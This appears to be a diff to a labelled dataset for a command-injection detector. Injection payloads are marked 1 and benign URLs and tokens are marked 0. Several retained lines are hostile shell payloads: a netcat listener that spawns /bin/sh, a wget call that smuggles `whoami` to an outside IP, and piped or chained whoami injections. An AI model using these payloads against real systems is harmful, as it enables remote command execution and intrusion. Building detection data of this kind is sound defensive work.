@@ -5040,10 +5040,10 @@ which wget,1
 whoami,1
 | whoami,1
 ; whoami,1
- whoami,1
- || whoami,1
- & whoami,1
- && whoami,1
+whoami,1
+|| whoami,1
+& whoami,1
+&& whoami,1
 """ whoami",1
 """ || whoami",1
 """ | whoami",1
@@ -5172,9 +5172,59 @@ ls -l /var/www/*,1
 \n\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\`whoami\`,1
 \n/bin/ls -al\n,1
 | nc -lvvp 4444 -e /bin/sh|,1
-,1
-,1
-,1
-,1
-,1
-,1
+https://learning.tcsionhub.in/iDH/India/,0
+https://translate.google.co.in/,0
+https://github.com/ajinmathew,0
+https://mail.google.com/mail/u/0/#inbox,0
+https://www.youtube.com/,0
+https://www.google.com/?hl=en-US&authuser=1,0
+https://myaccount.google.com/?utm_source=sign_in_no_continue&pli=1,0
+https://drive.google.com/file/d/1cdR_rd9nja1I2IBUsVbWoBLQkhWP45fS/edit,0
+https://www.python.org/,0
+https://github.com/WebSec-ext,0
+https://www.duk.ac.in/moodle/,0
+https://www.duk.ac.in/moodle/course/view.php?id=634,0
+http,0
+https,0
+www.google.com,0
+google,0
+com,0
+ac.in,0
+org,0
+in,0
+index.php,0
+index.html,0
+login.php,0
+login.html,0
+id,0
+?,0
+login,0
+moodle,0
+duk,0
+iiitmk,0
+mail,0
+youtube,0
+inbox,0
+hl,0
+en-US,0
+github,0
+translate,0
+learning,0
+tcs.com,0
+india,0
+america,0
+africa,0
+web,0
+whatsapp,0
+google.co.in,0
+www.duk.ac.in,0
+drive,0
+file,0
+python,0
+course,0
+view,0
+view.php,0
+id=674,0
+/d/,0
+files,0
+docs,0
